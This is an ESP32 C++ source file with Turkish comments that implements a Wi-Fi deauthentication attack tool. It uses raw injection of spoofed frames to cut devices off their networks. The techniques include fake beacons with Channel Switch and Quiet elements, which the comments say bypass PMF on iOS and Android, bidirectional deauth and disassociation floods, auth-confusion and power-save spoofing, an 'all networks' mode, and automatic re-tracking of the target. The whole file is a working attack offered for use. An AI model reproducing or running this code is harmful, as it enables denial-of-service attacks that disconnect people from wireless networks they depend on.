#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
deauth_frame_t deauth_frame;
int   deauth_type           = DEAUTH_TYPE_SINGLE;
int   eliminated_stations   = 0;
char  deauth_target_ssid[33] = {0};
uint8_t deauth_target_bssid[6] = {0};
int   deauth_target_channel = 1;

// ─── Düşük seviye bağımlılıklar ───────────────────────────────────────────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// ─── CSA Beacon (iOS / Android PMF bypass) ───────────────────────────────────
// Channel Switch Announcement: hedef AP'den sahte beacon gönderir,
// istemcilere olmayan bir kanala geçmesini söyler → bağlantı kesilir.
IRAM_ATTR void send_csa_beacon() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;

  const uint8_t *bssid    = deauth_frame.access_point;
  const char    *ssid     = deauth_target_ssid;
  uint8_t        channel  = (uint8_t)deauth_target_channel;
  uint8_t        ssid_len = (uint8_t)strnlen(ssid, 32);

  uint8_t buf[128];
  uint8_t *p = buf;

  // ── MAC Başlık ──
  *p++ = 0x80; *p++ = 0x00;            // Frame control: Beacon
  *p++ = 0x00; *p++ = 0x00;            // Duration
  memset(p, 0xFF, 6); p += 6;          // DA: broadcast
  memcpy(p, bssid, 6); p += 6;         // SA: hedef BSSID
  memcpy(p, bssid, 6); p += 6;         // BSSID
  *p++ = 0x00; *p++ = 0x00;            // Sequence control

  // ── Beacon Gövdesi ──
  memset(p, 0x00, 8); p += 8;          // Timestamp
  *p++ = 0x64; *p++ = 0x00;            // Beacon interval: 100 TU
  *p++ = 0x11; *p++ = 0x04;            // Capability: ESS + short slot

  // SSID IE
  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  // Supported Rates IE
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  // DS Parameter Set IE (mevcut kanal)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  // CSA IE (ID=37) — kanal 14'e geç, modern öncesi cihazlar
  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01; *p++ = 0x0E; *p++ = 0x01; // Mode1, Ch14, Count1

  // ECSA IE (ID=60/0x3C) — Extended CSA, modern chipset'ler için
  *p++ = 0x3C; *p++ = 0x04;
  *p++ = 0x01;  // Mode 1 (TX durdur)
  *p++ = 0x51;  // Operating class 81 (2.4 GHz)
  *p++ = 0x0E;  // Kanal 14 (geçersiz → cihaz bağlantıyı keser)
  *p++ = 0x01;  // Count 1

  // Quiet IE (ID=40/0x28) — tüm TX'leri beacon süresince durdurur
  // Android + iOS PMF olan cihazlarda da çalışır
  *p++ = 0x28; *p++ = 0x06;
  *p++ = 0x01;         // Quiet count: 1 TBTT
  *p++ = 0x01;         // Quiet period: her beacon'da
  *p++ = 0xFF; *p++ = 0x7F; // Quiet duration: maksimum
  *p++ = 0x00; *p++ = 0x00; // Quiet offset: 0

  int frame_len = (int)(p - buf);

  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, buf, frame_len, false);
    delayMicroseconds(500);
  }
}

// ─── Yardımcı: Auth confusion (0xB0) ─────────────────────────────────────────
IRAM_ATTR static void send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[30];
  uint8_t *p = buf;
  *p++ = 0xB0; *p++ = 0x00;
  *p++ = 0x3A; *p++ = 0x01;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;  // Open System auth
  *p++ = 0x02; *p++ = 0x00;  // Seq 2 (response)
  *p++ = 0x0D; *p++ = 0x00;  // Status 13: too many stations
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

// ─── Yardımcı: NULL data power-save spoof ────────────────────────────────────
IRAM_ATTR static void send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[24];
  uint8_t *p = buf;
  *p++ = 0x48; *p++ = 0x11;  // Null data, ToDS=1, PM=1
  *p++ = 0x00; *p++ = 0x00;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, sta,   6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

// ─── Promiscuous sniffer ───────────────────────────────────────────────────────
// iOS PMF bypass: hem deauth (0xC0) hem disassoc (0xA0) gönderilir
// Android 16+: birden fazla reason kodu + broadcast frame
// (retrack_deauth_target'tan önce tanımlandı — forward declaration gerekmez)
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *pkt = (wifi_packet_t *)raw->payload;
  const mac_hdr_t *hdr = &pkt->hdr;

  if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;

  // reason 7: class3/non-assoc (iOS 14+, Android 12+)
  // reason 6: class2/non-auth  (PMF bypass)
  // reason 2: prev-auth expired (eski cihazlar)
  // reason 3: leaving BSS       (evrensel fallback)
  static const uint8_t reasons[4] = {7, 6, 2, 3};

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
    memcpy(deauth_frame.station, hdr->src, 6);

    // ── Yön 1: AP → Station (4 reason kodu, DEAUTH + DISASSOC) ────────────
    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0;
      deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
    }

    // ── Yön 2: Station → AP spoof (bidirectional) ──────────────────────────
    // AP'nin association tablosunu temizler → cihaz yeniden auth olmak zorunda
    {
      deauth_frame_t f_rev;
      memcpy(f_rev.access_point, deauth_frame.access_point, 6); // BSSID = hedef AP
      memcpy(f_rev.sender,       hdr->src,                  6); // kaynak = cihaz (spoof)
      memcpy(f_rev.station,      deauth_frame.access_point, 6); // hedef  = AP
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 10; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 10; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);
    }

    // ── Auth confusion + NULL power-save — modern iOS/Android/Windows ──────
    send_auth_confusion(deauth_frame.access_point, hdr->src);
    send_null_powerdown(deauth_frame.access_point, hdr->src);

    // ── Broadcast DEAUTH + DISASSOC ────────────────────────────────────────
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 6; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 6; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // Çerçeveyi geri yükle
    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;

  } else { // DEAUTH_TYPE_ALL — havadaki tüm AP/istemci çiftlerine
    if ((memcmp(hdr->dest, hdr->bssid, 6) != 0) ||
        (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0)) return;

    memcpy(deauth_frame.station,      hdr->src,  6);
    memcpy(deauth_frame.access_point, hdr->dest, 6);
    memcpy(deauth_frame.sender,       hdr->dest, 6);

    // AP → Station (4 reason)
    for (int r = 0; r < 4; r++) {
      deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      deauth_frame.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    }

    // Station → AP spoof (bidirectional)
    {
      deauth_frame_t f_rev;
      memcpy(f_rev.access_point, hdr->dest, 6);
      memcpy(f_rev.sender,       hdr->src,  6);
      memcpy(f_rev.station,      hdr->dest, 6);
      f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
      for (int i = 0; i < 8; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &f_rev, sizeof(f_rev), false);
      f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
      for (int i = 0; i < 8; i++)
        esp_wifi_80211_tx(WIFI_IF_STA, &f_rev, sizeof(f_rev), false);
    }

    // Broadcast DEAUTH + DISASSOC
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0; deauth_frame.reason = 3;
    for (int i = 0; i < 4; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 4; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);

    // Geri yükle
    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;
  }

  eliminated_stations++;
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// ─── Hedef yeniden bulma (router yeniden başlatılırsa) ────────────────────────
void retrack_deauth_target() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;
  if (strnlen(deauth_target_ssid, 33) == 0) return;

  DEBUG_PRINT("Hedef yeniden taraniyor: ");
  DEBUG_PRINTLN(deauth_target_ssid);

  esp_wifi_set_promiscuous(false);

  int n = WiFi.scanNetworks(false, true, false, 120);
  for (int i = 0; i < n; i++) {
    if (strcmp(WiFi.SSID(i).c_str(), deauth_target_ssid) == 0) {
      int new_ch = WiFi.channel(i);
      bool bssid_changed = memcmp(WiFi.BSSID(i), deauth_target_bssid, 6) != 0;
      bool chan_changed   = (new_ch != deauth_target_channel);

      if (chan_changed || bssid_changed) {
        deauth_target_channel = new_ch;
        memcpy(deauth_target_bssid, WiFi.BSSID(i), 6);
        memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
        memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
        WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
        delay(100);
        apply_max_performance();
        DEBUG_PRINTF("Hedef yeni kanal: %d\n", deauth_target_channel);
      }
      break;
    }
  }
  WiFi.scanDelete();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

// ─── Saldırı başlat/durdur ────────────────────────────────────────────────────
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    strncpy(deauth_target_ssid, WiFi.SSID(wifi_number).c_str(), 32);
    deauth_target_ssid[32] = '\0';
    deauth_target_channel = WiFi.channel(wifi_number);
    memcpy(deauth_target_bssid, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
    memcpy(deauth_frame.sender,       deauth_target_bssid, 6);

    DEBUG_PRINT("Deauth baslatiyor: ");
    DEBUG_PRINTLN(deauth_target_ssid);

    WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
    delay(100);
    apply_max_performance();
  } else {
    DEBUG_PRINTLN("Tum aglara deauth...");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    delay(100);
    apply_max_performance();
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Deauth durduruluyor...");
  esp_wifi_set_promiscuous(false);
  deauth_type = DEAUTH_TYPE_SINGLE;
  memset(deauth_target_ssid, 0, sizeof(deauth_target_ssid));
}
